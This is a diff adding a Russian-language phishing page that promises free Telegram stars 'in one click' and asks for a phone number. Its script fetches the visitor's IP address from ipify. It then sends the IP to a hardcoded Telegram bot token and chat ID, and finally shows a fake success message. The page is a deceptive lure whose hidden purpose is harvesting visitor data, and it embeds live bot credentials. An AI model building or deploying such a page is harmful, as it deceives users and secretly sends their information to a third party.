@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html lang="ru">
+
+<head>
+    <meta charset="UTF-8">
+    <title>Халявные звезды Telegram</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
+    <style>
+        body {
+            margin: 0;
+            font-family: 'Roboto', sans-serif;
+            background-color: #f5f8fb;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            color: #222;
+        }
+
+        .container {
+            background: white;
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+            width: 90%;
+            max-width: 400px;
+            text-align: center;
+        }
+
+        h1 {
+            color: #0088cc;
+            font-size: 20px;
+            margin-bottom: 20px;
+        }
+
+        input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            font-size: 16px;
+        }
+
+        button {
+            width: 100%;
+            padding: 12px;
+            background-color: #0088cc;
+            border: none;
+            color: white;
+            font-size: 16px;
+            border-radius: 8px;
+            cursor: pointer;
+        }
+
+        button:hover {
+            background-color: #007ab8;
+        }
+
+        .top-banner {
+            position: absolute;
+            top: 0;
+            width: 100%;
+            background-color: #0088cc;
+            color: white;
+            text-align: center;
+            padding: 10px 0;
+            font-weight: bold;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="top-banner">
+        Получите бесплатно звезды Тг за один клик ⭐
+    </div>
+
+    <div class="container">
+        <input type="text" placeholder="Введите номер телефона" />
+        <button onclick="sendIP()">Получить звезды</button>
+    </div>
+    <script>
+        function sendIP() {
+            fetch("https://api.ipify.org?format=json")
+                .then(response => response.json())
+                .then(data => {
+                    let ip = data.ip;
+                    let token = "8059351572:AAHMF0lgje1u8pGG0QlwoiawcElk96BieyI";
+                    let chatId = "7281878643";
+                    let text = `🔔 Новый IP: ${ip}`;
+
+                    let url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`;
+
+                    fetch(url)
+                        .then(response => {
+                            if (response.ok) {
+                                alert("Поздравляем вы успешно отправили заявку на получение звезд!");
+                            }
+                        });
+                })
+                .catch(error => {
+                    alert("Ошибка получения IP: " + error);
+                });
+        }
+    </script>
+</body>
+
+</html>
